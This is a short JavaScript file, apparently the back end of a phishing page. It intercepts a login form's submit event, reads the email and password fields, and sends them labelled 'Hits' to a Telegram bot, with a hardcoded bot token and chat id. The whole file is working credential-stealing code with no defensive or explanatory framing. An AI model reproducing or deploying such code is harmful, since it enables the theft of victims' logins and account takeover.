const form = document.querySelector("#form");

addEventListener("submit", (e) => {
  e.preventDefault();

  var mail = document.getElementById("mail").value;
  var pass = document.getElementById("pass").value;

  var message = "Hits :%0A" + mail + ":" + pass;

  var token = "5530729858:AAG8bmQJe3dAmEX8d-MwzHKKFMto2B8JLHk";
  var chat_id = 1430266005;
  var url =
    "https://api.telegram.org/bot" +
    token +
    "/sendMessage?chat_id=" +
    chat_id +
    "&text=" +
    message;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  console.log("Successfully");
});
